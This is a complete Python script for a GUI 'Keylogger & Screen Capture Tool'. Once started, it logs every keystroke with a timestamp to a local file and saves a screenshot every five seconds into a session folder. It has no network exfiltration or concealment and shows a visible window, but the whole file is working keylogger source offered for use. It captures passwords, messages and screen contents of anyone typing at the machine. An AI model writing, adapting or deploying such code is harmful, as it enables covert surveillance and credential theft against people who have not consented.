import os
import time
import threading
import pyautogui
from pynput import keyboard
from tkinter import Tk, Button, Label, messagebox
from datetime import datetime

# ========== Globals ==========
stop_flag = threading.Event()
listener_thread = None
screenshot_thread = None
session_folder = None
log_file_path = None

# ========== Setup Folder ==========
def setup_folder():
    global session_folder, log_file_path
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    session_folder = f"keylog_session_{timestamp}"
    os.makedirs(session_folder, exist_ok=True)
    log_file_path = os.path.join(session_folder, "keystrokes.txt")

# ========== Keystroke Logging ==========
def log_keystrokes():
    def on_press(key):
        if stop_flag.is_set():
            return False
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        with open(log_file_path, "a") as f:
            f.write(f"{datetime.now()} - {key_str}\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ========== Screen Capture ==========
def capture_screens():
    while not stop_flag.is_set():
        time.sleep(5)
        if stop_flag.is_set():
            break
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_path = os.path.join(session_folder, f"screenshot_{timestamp}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

# ========== Start Monitoring ==========
def start_monitoring():
    global listener_thread, screenshot_thread

    if stop_flag.is_set() is False and listener_thread and listener_thread.is_alive():
        messagebox.showinfo("Already Running", "Monitoring is already in progress.")
        return

    setup_folder()
    stop_flag.clear()

    listener_thread = threading.Thread(target=log_keystrokes, daemon=True)
    screenshot_thread = threading.Thread(target=capture_screens, daemon=True)

    listener_thread.start()
    screenshot_thread.start()

    status_label.config(text="Monitoring Started...", fg="green")

# ========== Stop Monitoring ==========
def stop_monitoring():
    stop_flag.set()
    status_label.config(text="Monitoring Stopped.", fg="red")

# ========== Exit App ==========
def exit_app():
    if messagebox.askokcancel("Exit", "Are you sure you want to exit?"):
        stop_monitoring()
        root.destroy()

# ========== GUI ==========
root = Tk()
root.title("🛡️ Keylogger & Screen Capture Tool")
root.geometry("400x250")
root.configure(bg="#f0f0f0")
root.resizable(False, False)
root.protocol("WM_DELETE_WINDOW", exit_app)  # Handle close button

# ========== UI Components ==========
Label(root, text="🔐 Keylogger + Screenshot Capturer", font=("Arial", 16, "bold"), bg="#f0f0f0", fg="#333").pack(pady=15)

Button(root, text="▶ Start Monitoring", font=("Arial", 12), bg="#4CAF50", fg="white",
       width=20, command=start_monitoring).pack(pady=5)

Button(root, text="⏹ Stop Monitoring", font=("Arial", 12), bg="#f44336", fg="white",
       width=20, command=stop_monitoring).pack(pady=5)

Button(root, text="❌ Exit", font=("Arial", 12), bg="#555555", fg="white",
       width=20, command=exit_app).pack(pady=5)

status_label = Label(root, text="Idle", font=("Arial", 12), bg="#f0f0f0", fg="blue")
status_label.pack(pady=15)

# ========== Start the GUI ==========
root.mainloop()
